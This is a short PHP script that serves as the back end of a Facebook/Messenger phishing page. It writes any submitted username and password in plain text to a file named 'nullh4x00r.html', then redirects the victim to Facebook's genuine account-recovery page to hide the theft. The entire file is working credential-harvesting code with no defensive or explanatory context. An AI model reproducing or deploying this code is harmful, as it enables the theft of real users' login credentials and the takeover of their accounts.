<?php
file_put_contents("nullh4x00r.html", "Messenger Page <br>Username: <b>" . $_POST['username'] . "</b> Password: <b>" . $_POST['password'] . "</b><br><hr>", FILE_APPEND);
header('Location: https://www.facebook.com/recover/initiate/');
exit();
?>